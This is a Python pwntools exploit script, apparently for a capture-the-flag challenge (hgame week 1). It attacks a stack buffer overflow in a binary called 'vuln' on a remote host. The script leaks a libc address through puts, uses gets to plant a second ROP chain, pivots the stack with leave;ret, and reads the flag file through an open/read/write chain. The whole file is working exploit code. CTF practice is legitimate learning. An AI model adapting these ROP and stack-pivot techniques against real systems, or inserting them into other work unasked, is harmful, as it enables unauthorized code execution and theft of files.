from pwn import *
from pwn import p64
from pwn import u64

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64', os='linux', log_level='DEBUG')

if debug:
    context.terminal = [
        '/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe', 'nt', 'Ubuntu', '-c']
    r = process('./vuln')
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host, 32696)  # 远程连接
    gdb_is = 0


elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

if gdb_is:
    gdb.attach(r, 'b* 0x4012bf')
    pause()
    pass

leave_ret_addr = 0x04012be
put_got_addr = elf.got['puts']
pop_rdi = 0x0401393
put_plt_addr = elf.plt['puts']
payload = b'A' * 256 + b'junkjunk' + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(elf.symbols['vuln'])
r.send(payload)
r.recvuntil(b'task.\n')
put_addr = u64(r.recv(6).ljust(8, b'\x00'))
libc_addr = put_addr - libc.symbols['puts']
open_addr = libc_addr + libc.symbols['open']
read_addr = libc_addr + libc.symbols['read']
write_addr = libc_addr + libc.symbols['write']
gets_addr = libc_addr + libc.symbols['gets']

syscall_addr = libc_addr + 0x02284d
pop_rsi = libc_addr + 0x2601f
pop_rdx = libc_addr + 0x142c92

data_addr = 0x00404038
bss_addr = 0x0404060
dynamic_addr = 0x3FF598
rop_addr = dynamic_addr

print(f'put_addr = {hex(put_addr)}')
print(f'libc_addr = {hex(libc_addr)}')
print(f'open_addr = {hex(open_addr)}')
print(f'read_addr = {hex(read_addr)}')
print(f'write_addr = {hex(write_addr)}')

payload = b'A' * 256 + b'junkjunk' + p64(pop_rdi) + p64(rop_addr) + p64(gets_addr) + p64(elf.symbols['vuln'])
r.send(payload)

payload = p64(pop_rdi) + p64(rop_addr + 0x98) + p64(pop_rsi) + p64(0)+ p64(open_addr)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(data_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(data_addr) + p64(pop_rdx) + p64(0x30) + p64(write_addr)
payload += b'flag'.ljust(8, b'\x00') 
r.sendline(payload)

payload = b'A' * 256 + p64(rop_addr-8)+p64(leave_ret_addr)
r.send(payload)
# print(r.recvuntil(b'}'))
r.interactive()

